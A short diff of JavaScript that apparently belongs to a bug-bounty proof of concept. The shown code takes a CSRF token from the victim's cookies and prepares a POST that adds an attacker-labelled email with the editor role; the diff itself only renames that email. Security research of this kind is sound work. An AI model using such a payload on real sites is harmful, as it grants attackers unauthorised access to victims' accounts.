@@ -9,7 +9,7 @@ let headers = {
     'X-Ts-Csrf': document.cookie.substring(11)
 };
 
-jsonObj={"email":"gtrf+badguy@bugcrowdninja.com", "role":"editor"}
+jsonObj={"email":"gtrf+badguy42@bugcrowdninja.com", "role":"editor"}
 
 async function makePostRequest(url, requestType, headers){
     await fetch(
